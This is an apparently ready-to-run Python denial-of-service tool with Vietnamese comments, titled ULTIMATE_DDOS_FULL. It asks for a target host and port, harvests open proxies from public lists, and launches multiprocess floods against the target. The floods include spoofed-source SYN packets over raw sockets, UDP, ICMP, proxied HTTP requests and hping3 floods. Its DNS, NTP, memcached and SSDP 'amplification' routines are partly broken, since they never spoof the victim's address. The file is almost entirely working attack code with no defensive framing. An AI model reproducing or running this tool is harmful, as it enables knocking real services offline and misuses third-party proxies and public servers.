#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   ULTIMATE_DDOS_FULL.py – Nhập IP hoặc Domain, tự động phân giải
#   Tích hợp debug, proxy, đa tiến trình, hping3, raw socket
#

import os, sys, time, random, socket, struct, threading, multiprocessing
import subprocess, requests
from pathlib import Path
from ctypes import CDLL, c_int, c_void_p
from ctypes.util import find_library
from concurrent.futures import ThreadPoolExecutor

# ---------------------- CẤU HÌNH MẶC ĐỊNH ---------------------------
CONFIG = {
    "target_host": "",
    "target_ip": "",
    "target_port": 80,
    "threads_per_process": 200,
    "num_processes": 0,
    "duration": 0,
    "use_proxy": True,
    "fallback_to_own_ip": True,
    "use_hping3": True,
    "proxy_scan_interval": 60,
    "http_ratio": 0.5,
    "raw_modes": ["syn","udp","icmp","dns","ntp","memcached","ssdp"],
    "max_proxy_fails": 3,
    "proxy_timeout": 3,
    "proxy_sources": [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://api.openproxylist.xyz/socks5.txt",
        "https://api.openproxylist.xyz/http.txt",
        "https://proxyspace.pro/proxies.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/socks5.txt"
    ],
    "dns_servers": ["8.8.8.8","1.1.1.1","8.8.4.4","1.0.0.1","9.9.9.9","208.67.222.222","208.67.220.220"],
    "ntp_servers": ["0.pool.ntp.org","1.pool.ntp.org","2.pool.ntp.org","3.pool.ntp.org"],
    "memcached_servers": [],
    "ssdp_multicast": "239.255.255.250"
}

packet_counter = multiprocessing.Value('Q', 0)
error_counter = multiprocessing.Value('Q', 0)

# ---------------------- HÀM NHẬP VÀ PHÂN GIẢI -----------------------
def safe_input(prompt, default=None, required=False, cast_type=str):
    while True:
        try:
            val = input(prompt)
            if val.strip() == "" and default is not None:
                return default
            if required and val.strip() == "":
                print("[!] Vui lòng nhập giá trị.")
                continue
            if cast_type == int:
                return int(val)
            return val
        except ValueError:
            print("[!] Sai định dạng, nhập lại.")
        except KeyboardInterrupt:
            print("\n[!] Thoát.")
            sys.exit(0)

def resolve_host(host):
    try:
        ip = socket.gethostbyname(host)
        return ip
    except:
        return host

def get_user_input():
    print("\n" + "="*60)
    print("   ULTIMATE DDOS – Hỗ trợ IP hoặc Domain")
    print("="*60)
    host = safe_input("Target (IP hoặc domain, vd: 1.2.3.4 hoặc example.com): ", required=True)
    ip = resolve_host(host)
    CONFIG["target_host"] = host
    CONFIG["target_ip"] = ip
    print(f"[*] Phân giải: {host} -> {ip}")
    CONFIG["target_port"] = safe_input("Port (mặc dinh 80): ", default=80, cast_type=int)
    CONFIG["threads_per_process"] = safe_input("Luồng mỗi tiến trình (mặc định 200): ", default=200, cast_type=int)
    cpu = os.cpu_count() or 4
    CONFIG["num_processes"] = safe_input(f"Số tiến trình (0 = auto = {cpu}): ", default=0, cast_type=int)
    if CONFIG["num_processes"] == 0:
        CONFIG["num_processes"] = cpu
    CONFIG["duration"] = safe_input("Thời gian (giây, 0 = vô hạn): ", default=0, cast_type=int)
    CONFIG["use_proxy"] = safe_input("Dùng proxy? (y/n, mặc định y): ", default='y').lower() != 'n'
    CONFIG["fallback_to_own_ip"] = safe_input("Fallback IP thật? (y/n, mặc định y): ", default='y').lower() != 'n'
    CONFIG["use_hping3"] = safe_input("Dùng hping3 song song? (y/n, mặc định y): ", default='y').lower() != 'n'
    print("="*60)
    print("[*] Cấu hình:")
    for k, v in CONFIG.items():
        if k not in ["proxy_sources","dns_servers","ntp_servers","memcached_servers"]:
            print(f"    {k}: {v}")
    print("="*60)
    return CONFIG

# ---------------------- QUÉT PROXY ----------------------------------
def fetch_proxies_parallel():
    proxies = set()
    def get_from_url(url):
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                res = []
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        if '://' in line:
                            line = line.split('://')[1]
                        res.append(line)
                return res
        except:
            return []
        return []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(get_from_url, url) for url in CONFIG["proxy_sources"]]
        for f in futures:
            try:
                for p in f.result():
                    proxies.add(p)
            except:
                pass
    good = []
    for p in list(proxies)[:3000]:
        try:
            ip, port = p.split(':')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            start = time.time()
            sock.connect((ip, int(port)))
            sock.close()
            if time.time() - start < 0.2:
                good.append(p)
        except:
            pass
    with open("proxies.txt", 'w') as f:
        for p in good:
            f.write(p + "\n")
    return good

# ---------------------- CTYPES --------------------------------------
_libc = None
try:
    _libc = CDLL(find_library("c"))
    _libc.sendto.argtypes = [c_int, c_void_p, c_int, c_int, c_void_p, c_int]
    _libc.sendto.restype = c_int
except:
    _libc = None

def send_raw_fast(sock, packet, dest_ip, dest_port):
    try:
        if _libc:
            addr = struct.pack('=H4s', socket.AF_INET, socket.inet_aton(dest_ip))
            ret = _libc.sendto(sock.fileno(), packet, len(packet), 0, addr, len(addr))
        else:
            ret = sock.sendto(packet, (dest_ip, dest_port))
        if ret > 0:
            with packet_counter.get_lock():
                packet_counter.value += 1
        return ret
    except:
        with error_counter.get_lock():
            error_counter.value += 1
        return -1

# ---------------------- TẤN CÔNG RAW --------------------------------
def syn_flood(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while True:
            src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            sport = random.randint(1024,65535)
            seq = random.randint(0,2**32-1)
            pkt = b'\x45\x00\x00\x28' + struct.pack('!HH', random.randint(0,65535), 0)
            pkt += struct.pack('!BBH', 255, 6, 0)
            pkt += socket.inet_aton(src) + socket.inet_aton(target_ip)
            pkt += struct.pack('!HHIIBBHHH', sport, target_port, seq, 0, 0x50, 0x02, 65535, 0, 0)
            send_raw_fast(sock, pkt, target_ip, target_port)
    except:
        pass

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65507)
    while True:
        send_raw_fast(sock, data, target_ip, target_port)

def icmp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
    while True:
        send_raw_fast(sock, pkt, target_ip, 0)

def dns_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    domain = 'isc.org'
    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
    for part in domain.split('.'):
        q += bytes([len(part)]) + part.encode()
    q += b'\x00' + struct.pack('!HH', 1, 1)
    servers = CONFIG["dns_servers"]
    while True:
        s = random.choice(servers)
        send_raw_fast(sock, q, s, 53)

def ntp_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
    servers = CONFIG["ntp_servers"]
    while True:
        s = random.choice(servers)
        send_raw_fast(sock, q, s, 123)

def memcached_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    q = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
    servers = CONFIG["memcached_servers"] or ['8.8.8.8']
    while True:
        s = random.choice(servers)
        send_raw_fast(sock, q, s, 11211)

def ssdp_amp(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    msg = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
    while True:
        send_raw_fast(sock, msg.encode(), CONFIG["ssdp_multicast"], 1900)

def http_flood(proxy, target_ip, target_port):
    try:
        if '://' in proxy: proxy = proxy.split('://')[1]
        p_ip, p_port = proxy.split(':')
        p_port = int(p_port)
        proxy_dict = {
            'http': f'socks5://{p_ip}:{p_port}',
            'https': f'socks5://{p_ip}:{p_port}'
        }
        if 'http' in proxy.lower():
            proxy_dict = {'http': f'http://{p_ip}:{p_port}', 'https': f'http://{p_ip}:{p_port}'}
        url = f"http://{target_ip}:{target_port}/"
        headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
        while True:
            try:
                requests.get(url, proxies=proxy_dict, headers=headers, timeout=CONFIG["proxy_timeout"])
                requests.post(url, proxies=proxy_dict, headers=headers, data={'x':random.randint(1,9999)}, timeout=CONFIG["proxy_timeout"])
                with packet_counter.get_lock():
                    packet_counter.value += 2
            except:
                with error_counter.get_lock():
                    error_counter.value += 1
    except:
        pass

# ---------------------- WORKER --------------------------------------
def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_ref):
    fail_count = {}
    while True:
        proxy = None
        if CONFIG["use_proxy"] and proxy_list_ref and len(proxy_list_ref) > 0:
            proxy = random.choice(proxy_list_ref)
            if proxy and fail_count.get(proxy, 0) >= CONFIG["max_proxy_fails"]:
                try:
                    proxy_list_ref.remove(proxy)
                except:
                    pass
                proxy = None
        if proxy and mode == 'http':
            http_flood(proxy, target_ip, target_port)
        else:
            if CONFIG["fallback_to_own_ip"] or not CONFIG["use_proxy"]:
                if mode == 'http':
                    try:
                        requests.get(f"http://{target_ip}:{target_port}/", timeout=1)
                        with packet_counter.get_lock():
                            packet_counter.value += 1
                    except:
                        with error_counter.get_lock():
                            error_counter.value += 1
                elif mode == 'syn':
                    syn_flood(target_ip, target_port)
                elif mode == 'udp':
                    udp_flood(target_ip, target_port)
                elif mode == 'icmp':
                    icmp_flood(target_ip)
                elif mode == 'dns':
                    dns_amp(target_ip)
                elif mode == 'ntp':
                    ntp_amp(target_ip)
                elif mode == 'memcached':
                    memcached_amp(target_ip)
                elif mode == 'ssdp':
                    ssdp_amp(target_ip)
            else:
                time.sleep(0.05)

def process_worker(target_ip, target_port, process_id, total_threads, proxy_manager_list):
    proxy_list = proxy_manager_list
    modes = ['http'] * int(total_threads * CONFIG["http_ratio"])
    raw_modes = CONFIG["raw_modes"]
    for _ in range(total_threads - len(modes)):
        modes.append(random.choice(raw_modes))
    random.shuffle(modes)
    threads = []
    for i, mode in enumerate(modes):
        t = threading.Thread(target=worker_loop, args=(process_id, i, target_ip, target_port, mode, proxy_list), daemon=True)
        t.start()
        threads.append(t)
    while True:
        time.sleep(10)

# ---------------------- DEBUG ---------------------------------------
def debug_loop(packet_counter, error_counter, proxy_list_ref):
    last_time = time.time()
    last_packets = 0
    while True:
        time.sleep(5)
        now = time.time()
        elapsed = now - last_time
        with packet_counter.get_lock():
            pkt = packet_counter.value
        with error_counter.get_lock():
            err = error_counter.value
        pps = (pkt - last_packets) / elapsed if elapsed > 0 else 0
        last_packets = pkt
        last_time = now
        proxy_count = len(proxy_list_ref) if proxy_list_ref else 0
        print(f"[DEBUG] {time.strftime('%H:%M:%S')} | Tổng gói: {pkt:,} | Lỗi: {err:,} | Tốc độ: {pps:,.0f} pps | Proxy: {proxy_count}")

# ---------------------- MAIN -----------------------------------------
def main():
    get_user_input()
    target_ip = CONFIG["target_ip"]
    target_port = CONFIG["target_port"]
    num_proc = CONFIG["num_processes"]
    threads_per_proc = CONFIG["threads_per_process"]
    total_threads = num_proc * threads_per_proc
    duration = CONFIG["duration"]
    
    print(f"\n[*] Khởi tạo với {num_proc} tiến trình, {total_threads} luồng.")
    print("[*] Đang quét proxy lần đầu...")
    
    manager = multiprocessing.Manager()
    proxy_list = manager.list()
    initial = fetch_proxies_parallel()
    for p in initial:
        proxy_list.append(p)
    print(f"[*] Đã có {len(proxy_list)} proxy chất lượng.")
    
    def proxy_updater(proxy_list):
        while True:
            time.sleep(CONFIG["proxy_scan_interval"])
            new = fetch_proxies_parallel()
            del proxy_list[:]
            for p in new:
                proxy_list.append(p)
            print(f"[*] Cập nhật proxy: {len(proxy_list)}")
    updater = multiprocessing.Process(target=proxy_updater, args=(proxy_list,), daemon=True)
    updater.start()
    
    if CONFIG["use_hping3"]:
        def hping3_worker():
            while True:
                cmd = f"hping3 -S -p {target_port} --flood --rand-source {target_ip}"
                subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(10)
        hproc = multiprocessing.Process(target=hping3_worker, daemon=True)
        hproc.start()
        print("[*] Đã kích hoạt hping3 song song.")
    
    processes = []
    for i in range(num_proc):
        p = multiprocessing.Process(target=process_worker, args=(
            target_ip, target_port, i, threads_per_proc, proxy_list
        ), daemon=True)
        p.start()
        processes.append(p)
    print(f"[*] Đã khởi động {num_proc} tiến trình.")
    
    debug_thread = threading.Thread(target=debug_loop, args=(packet_counter, error_counter, proxy_list), daemon=True)
    debug_thread.start()
    
    print("[*] Đang tấn công. Nhấn Ctrl+C để dừng.")
    try:
        if duration > 0:
            time.sleep(duration)
            print("[*] Hết thời gian. Thoát.")
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Người dùng dừng. Thoát.")
    finally:
        for p in processes:
            p.terminate()
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Khuyến nghị chạy với sudo để dùng raw socket.")
    main()
